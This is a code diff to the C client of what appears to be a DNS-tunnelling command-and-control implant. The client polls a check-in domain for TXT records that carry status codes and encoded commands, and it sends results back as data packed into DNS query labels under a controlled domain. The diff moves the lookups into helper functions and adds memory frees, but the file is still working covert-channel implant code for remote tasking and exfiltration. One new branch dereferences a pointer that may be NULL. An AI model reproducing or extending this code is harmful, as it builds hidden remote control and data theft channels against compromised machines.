@@ -7,6 +7,7 @@
 
 #include "options.h"
 
+#include "util/dns.h"
 #include "util/utils.h"
 #include "util/crypt.h"
 #include "util/json.h"
@@ -14,16 +15,14 @@
 
 #include "includes/base64/base64.h"
 
-/* DNS STUFF */
-#include <resolv.h>
-#include <ctype.h>
-/* DNS STUFF */
-
 #include "util/debug.h"
 
 const char *resp_idle = "v=B2B3FE1C";
 const char *resp_error = "v=D31CFAA4";
 const char *resp_cmd = "v=A9F466E8";
+
+const char *resp_success = "1.1.1.1";
+const char *resp_failure = "1.1.1.2";
 
 
 struct Client *init_client() {
@@ -111,62 +110,56 @@ char *str_to_response_bytes(client_t *client, char *res, int *res_length) {
 
 int send_response(client_t *client, char **data, int data_count) {
 
+    int err_fail = 0;
+
     for (int i = 0; i < data_count; i++) {
 
         char label[222]; // max label len
         snprintf(label, 222, "%s.%s", data[i], client->domain);
         Dprintf("[d] sending %d: %s\n", i, label);
 
-        u_char answer[255];
-        int len = res_query(label, ns_c_in, ns_t_a, answer, sizeof(answer));
-        if (len < 0) {
-            Dprintf("[d] resp len was: %d\n", len);
-//            return 1;
+        char *resp = dns_raw_a_lookup(label);
+
+        if (resp == NULL) {
+            Dprintf("[d] ! response was empty\n");
+            err_fail = 1;
         }
 
+        if (strstr(resp, resp_failure) != NULL) {
+            Dprintf("[d] server indicated that the request failed\n");
+            err_fail = 1;
+        }
+
+        if (strstr(resp, resp_success) != NULL) {
+            Dprintf("[d] server indicated the request was successful\n");
+        }
+
+        free(resp);
+    }
+
+    // let's not leak that arrays memory
+    for (int i = 0; i < data_count; i++) {
         free(data[i]);
     }
 
-    return 0;
+    client->status = Idle;
+
+    return err_fail;
 }
 
 
 int poll(client_t *client) {
 
-    u_char answer[255]; // a single TXT response string is max 255
-    char txt[255];
-    int len;
-    ns_msg msg;
-    ns_rr rr;
-
-    memset(txt, 0, 255);
-
-    len = res_query(client->checkin_domain, ns_c_in, ns_t_txt, answer, sizeof(answer));
-
-    if (len <= 0)
-        return 1;
-
-    if (ns_initparse(answer, len, &msg) < 0)
-        return 1;
-
-    if (ns_msg_count(msg, ns_s_an) > 1)
-        Dprintf("[d] dns response had more than 1 answers. we are only taking the first\n");
-
-    if (ns_parserr(&msg, ns_s_an, 0, &rr)) // take the first rr, 0
-        return 1;
-
-    if (ns_rr_type(rr) != ns_t_txt)
-        return 1;
-
-    // first byte seems to be a size byte maybe?
-    strncpy(txt, (char *) ns_rr_rdata(rr) + 1, ns_rr_rdlen(rr));
+    char *txt = dns_raw_txt_lookup(client->checkin_domain);
 
     if (strstr(txt, resp_idle) != NULL) {
+        free(txt);
         client->status = Idle;
         return 1;
     }
 
     if (strstr(txt, resp_error) != NULL) {
+        free(txt);
         client->status = Error;
         return 1;
     }
@@ -175,6 +168,7 @@ int poll(client_t *client) {
         // double check and make sure we have ,p=
         if (strstr(txt, ",p=") == NULL) {
             // something is wrong, lets ignore that response
+            free(txt);
             client->status = Idle;
             return 1;
         }
@@ -202,6 +196,8 @@ int poll(client_t *client) {
         client->command = c;
         client->status = Command;
     }
+
+    free(txt);
 
     return 1;
 }
